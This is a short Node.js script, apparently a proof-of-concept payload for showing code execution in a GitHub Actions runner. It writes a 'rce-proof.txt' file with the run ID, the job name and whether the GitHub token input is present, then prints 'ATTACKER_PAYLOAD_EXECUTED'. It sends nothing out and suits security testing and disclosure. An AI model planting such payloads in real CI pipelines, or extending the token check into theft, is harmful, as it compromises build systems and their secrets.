const fs = require('fs')
fs.writeFileSync(
  '/home/runner/work/rce-proof.txt',
  'RCE_CONFIRMED run=' + process.env.GITHUB_RUN_ID +
  ' job=' + process.env.GITHUB_JOB +
  ' token_present=' + Boolean(process.env['INPUT_GITHUB-TOKEN']) +
  '\n'
)
console.log('ATTACKER_PAYLOAD_EXECUTED')
